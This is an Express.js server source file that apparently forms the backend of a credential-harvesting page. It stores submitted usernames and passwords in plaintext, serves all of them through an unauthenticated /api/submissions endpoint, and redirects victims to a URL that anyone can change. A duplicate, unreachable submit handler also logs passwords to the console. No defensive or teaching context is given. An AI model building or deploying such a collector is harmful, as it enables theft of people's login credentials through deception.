const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Ensure necessary files exist
if (!fs.existsSync('submissions.json')) fs.writeFileSync('submissions.json', JSON.stringify([]));
if (!fs.existsSync('config.json')) fs.writeFileSync('config.json', JSON.stringify({ redirectUrl: '/thankyou.html' }));

// Serve the form and admin pages
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Handle form submission
app.post('/api/submit', (req, res) => {
  const { username, password } = req.body;

  if (username && password) {
    const submissions = JSON.parse(fs.readFileSync('submissions.json', 'utf8'));
    submissions.push({ username, password, timestamp: new Date().toISOString() });
    fs.writeFileSync('submissions.json', JSON.stringify(submissions, null, 2));

    const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
    res.json({ message: 'Submission successful', redirectUrl: config.redirectUrl });
  } else {
    res.status(400).json({ message: 'Invalid input' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
app.post('/api/submit', (req, res) => {
  console.log('Received data:', req.body);

  const { username, password } = req.body;
  if (username && password) {
    const submissions = JSON.parse(fs.readFileSync('submissions.json', 'utf8'));
    submissions.push({ username, password, timestamp: new Date().toISOString() });
    fs.writeFileSync('submissions.json', JSON.stringify(submissions, null, 2));
    console.log('Saved submission:', { username, password });

    const config = JSON.parse(fs.readFileSync('config.json', 'utf8'));
    res.json({ message: 'Submission successful', redirectUrl: config.redirectUrl });
  } else {
    res.status(400).json({ message: 'Invalid input' });
  }
});
app.get('/api/submissions', (req, res) => {
  const submissions = JSON.parse(fs.readFileSync('submissions.json', 'utf8'));
  res.json(submissions);
});
app.post('/api/config/redirect', (req, res) => {
  const { redirectUrl } = req.body;

  if (redirectUrl) {
    // Save the new redirect URL to config.json
    fs.writeFileSync('config.json', JSON.stringify({ redirectUrl }));
    res.json({ message: 'Redirect URL updated successfully' });
  } else {
    res.status(400).json({ message: 'Invalid URL' });
  }
});